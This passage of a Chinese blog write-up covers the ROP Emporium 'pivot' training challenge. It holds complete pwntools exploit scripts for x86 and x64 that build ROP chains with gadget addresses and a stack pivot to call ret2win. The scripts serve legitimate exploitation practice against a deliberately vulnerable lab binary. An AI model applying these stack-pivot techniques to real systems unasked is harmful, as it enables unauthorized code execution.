+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pivot32&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./pivot32&#x27;</span>)</span><br><span class="line"></span><br><span class="line">lib =ELF(<span class="string">&#x27;./libpivot32.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">foothold_function_plt = e.plt[<span class="string">&#x27;foothold_function&#x27;</span>]</span><br><span class="line">foothold_function_got = e.got[<span class="string">&#x27;foothold_function&#x27;</span>]</span><br><span class="line"></span><br><span class="line">foothold_function_offset = lib.symbols[<span class="string">&#x27;foothold_function&#x27;</span>]</span><br><span class="line">ret2win_offset = lib.symbols[<span class="string">&#x27;ret2win&#x27;</span>]</span><br><span class="line"><span class="comment"># 获取foodhold与ret2win函数之间的偏移量</span></span><br><span class="line"><span class="comment"># foodhold的真实地址+offset = ret2win函数的真实地址</span></span><br><span class="line">offset = ret2win_offset-foothold_function_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># Gadgets:</span></span><br><span class="line"><span class="comment">#这两条gadgets获取到foothold的真实地址，并将其保存到寄存器中，用于后续操作</span></span><br><span class="line">pop_eax_addr = <span class="number">0x0804882c</span> 	<span class="comment"># pop  eax;	ret  </span></span><br><span class="line">mov_eax_eaxs_addr = <span class="number">0x08048830</span> 	<span class="comment"># mov  eax,DWORD PTR [eax];ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># xchg_esp_eax_addr = 0x0804882e 	# xchg esp,eax;ret </span></span><br><span class="line"><span class="comment"># pop_ebp_addr = 0x0804889b    # pop ebp ; ret   </span></span><br><span class="line"><span class="comment">#调用eax中保存的函数地址处的函数</span></span><br><span class="line">call_eax = <span class="number">0x080485f0</span> <span class="comment"># call eax</span></span><br><span class="line"><span class="comment"># 除了call之外也可以使用jmp命令</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将offset保存到ebx中，计算ret2win的真实地址</span></span><br><span class="line">pop_ebx_addr = <span class="number">0x080484a9</span>    <span class="comment"># pop ebx ; ret</span></span><br><span class="line">add_eax_ebx_addr = <span class="number">0x08048833</span>    <span class="comment"># add  eax,ebx;ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 完成栈迁移</span></span><br><span class="line">leave_addr = <span class="number">0x080485f5</span>    <span class="comment"># leave ; ret</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;The Old Gods kindly bestow upon you a place to pivot: &quot;</span>)</span><br><span class="line">fake_ebp = <span class="built_in">int</span>(p.recv(<span class="number">10</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#迁移后的栈中存放的rop chain</span></span><br><span class="line">payload1 = p32(<span class="number">1</span>) <span class="comment">#虚假的ebp</span></span><br><span class="line">payload1+= p32(foothold_function_plt)</span><br><span class="line">payload1+= p32(pop_eax_addr)</span><br><span class="line">payload1+= p32(foothold_function_got)</span><br><span class="line">payload1+= p32(mov_eax_eaxs_addr)</span><br><span class="line">payload1+= p32(pop_ebx_addr)</span><br><span class="line">payload1+= p32(offset)</span><br><span class="line">payload1+= p32(add_eax_ebx_addr)</span><br><span class="line">payload1+= p32(call_eax)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">offset = <span class="number">44</span> - <span class="number">4</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">#payload2 利用leave指令跟fake_ebp来实现栈迁移</span></span><br><span class="line">payload2 = offset*<span class="string">b&#x27;A&#x27;</span></span><br><span class="line">payload2+= p32(fake_ebp)</span><br><span class="line">payload2+= p32(leave_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h2><p>64位情况与32位情况相同，需要注意一点：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ROP2:</span><br><span class="line">padding		# 40 - 8 </span><br><span class="line">fake rbp</span><br><span class="line">leave		</span><br></pre></td></tr></table></figure>
+
+<p>这里的 padding 长度为偏移量 - 8，64位环境下，<code>rbp</code>存储占8字节</p>
+<p>完整的exploit代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pivot&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./pivot&#x27;</span>)</span><br><span class="line">lib = ELF(<span class="string">&#x27;./libpivot.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">foothold_function_plt = e.plt[<span class="string">&#x27;foothold_function&#x27;</span>]</span><br><span class="line">foothold_function_got = e.got[<span class="string">&#x27;foothold_function&#x27;</span>]</span><br><span class="line"></span><br><span class="line">foothold_function_offset = lib.symbols[<span class="string">&#x27;foothold_function&#x27;</span>]</span><br><span class="line">ret2win_offset = lib.symbols[<span class="string">&#x27;ret2win&#x27;</span>]</span><br><span class="line">offset = ret2win_offset - foothold_function_offset</span><br><span class="line"></span><br><span class="line"><span class="comment">#Gadgets</span></span><br><span class="line">pop_rax_addr = <span class="number">0x4009bb</span> <span class="comment"># pop  rax;ret    </span></span><br><span class="line">xchg_rsp_rax_addr = <span class="number">0x4009bd</span> <span class="comment"># xchg rsp,rax;ret    </span></span><br><span class="line">mov_rax_raxs_addr = <span class="number">0x4009c0</span> <span class="comment"># mov  rax,QWORD PTR [rax];ret    </span></span><br><span class="line">add_rax_rbp_addr = <span class="number">0x4009c4</span> <span class="comment"># add  rax,rbp;ret    </span></span><br><span class="line">pop_rbp_addr = <span class="number">0x4007c8</span> <span class="comment"># pop rbp ; ret</span></span><br><span class="line">leave_addr = <span class="number">0x4008ef</span> <span class="comment"># leave ; ret</span></span><br><span class="line">call_rax_addr = <span class="number">0x00000000004006b0</span> <span class="comment"># call rax</span></span><br><span class="line">jmp_rax_addr = <span class="number">0x00000000004007c1</span> <span class="comment"># jmp rax</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;The Old Gods kindly bestow upon you a place to pivot: &quot;</span>)</span><br><span class="line">fake_ebp = <span class="built_in">int</span>(p.recv(<span class="number">14</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload1 = p64(<span class="number">1</span>)</span><br><span class="line">payload1+= p64(foothold_function_plt)</span><br><span class="line">payload1+= p64(pop_rax_addr)</span><br><span class="line">payload1+= p64(foothold_function_got)</span><br><span class="line">payload1+= p64(mov_rax_raxs_addr)</span><br><span class="line">payload1+= p64(pop_rbp_addr)</span><br><span class="line">payload1+= p64(offset)</span><br><span class="line">payload1+= p64(add_rax_rbp_addr)</span><br><span class="line">payload1+= p64(call_rax_addr)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">40</span> - <span class="number">8</span></span><br><span class="line"><span class="comment">#64bit，是8字节</span></span><br><span class="line"></span><br><span class="line">payload2 = offset*<span class="string">b&#x27;A&#x27;</span></span><br><span class="line">payload2+= p64(fake_ebp)</span><br><span class="line">payload2+= p64(leave_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/writeup/" rel="tag"># writeup</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/03/15/ROP_Emporium/Challenge6-fluff/" rel="prev" title="Challenge6_fluff">
+      <i class="fa fa-chevron-left"></i> Challenge6_fluff
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/03/16/Web/flex%E5%B8%83%E5%B1%80/" rel="next" title="flex布局">
+      flex布局 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#pivot-%E6%A0%88%E8%BF%81%E7%A7%BB"><span class="nav-number">1.</span> <span class="nav-text">pivot(栈迁移)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#x86"><span class="nav-number">1.1.</span> <span class="nav-text">x86</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#x64"><span class="nav-number">1.2.</span> <span class="nav-text">x64</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="郭小白QAQ"
+      src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/202303122318253.jpg">
+  <p class="site-author-name" itemprop="name">郭小白QAQ</p>
+  <div class="site-description" itemprop="description">精彩不亮丽，起落是无常</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">57</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">22</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="/guoxb0_0@qq.com" title="E-Mail → guoxb0_0@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">郭小白QAQ</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">105k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">6:21</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+<script src="https://cdn.jsdelivr.net/npm/darkmode-js@1.5.7/lib/darkmode-js.min.js"></script>
+
+<script>
+var options = {
+  bottom: '64px',
+  right: 'unset',
+  left: '32px',
+  time: '0.5s',
+  mixColor: 'transparent',
+  backgroundColor: 'transparent',
+  buttonColorDark: '#100f2c',
+  buttonColorLight: '#fff',
+  saveInCookies: true,
+  label: '🌓',
+  autoMatchOsTheme: true
+}
+const darkmode = new Darkmode(options);
+window.darkmode = darkmode;
+darkmode.showWidget();
+</script>
+
+</body>
+</html>
